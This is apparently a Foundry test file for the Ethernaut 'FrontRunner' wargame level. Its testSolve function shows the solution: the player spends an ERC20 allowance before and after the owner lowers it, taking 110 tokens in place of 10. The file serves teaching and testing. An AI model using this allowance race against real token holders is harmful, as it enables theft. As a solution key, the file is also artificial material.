// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {FrontRunner} from "src/levels/FrontRunner.sol";
import {FrontRunnerFactory} from "src/levels/FrontRunnerFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestFrontRunner is Test, Utils {
    Ethernaut ethernaut;
    FrontRunner instance;
    FrontRunnerFactory factory;

    address payable owner;
    address payable player;
    address constant ALICE = address(0xA11CE);

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        factory = new FrontRunnerFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = FrontRunner(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the initial state of the level and environment.
    function testInit() public {
        vm.startPrank(player);
        assertEq(instance.balanceOf(ALICE), 1_000 ether);
        assertEq(instance.allowance(ALICE, player), 100 ether);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
        vm.stopPrank();
    }

    /// @notice Test the solution for the level: no attacker contract needed.
    /// The player drains the original 100-token allowance, then triggers
    /// Alice's reduction to 10, then drains that too. approve() overwrites
    /// rather than adjusts, so both amounts are collectible.
    function testSolve() public {
        vm.startPrank(player);

        instance.transferFrom(ALICE, player, 100 ether);
        instance.triggerAliceReduce();
        instance.transferFrom(ALICE, player, 10 ether);

        assertEq(instance.balanceOf(player), 110 ether);
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
        vm.stopPrank();
    }
}
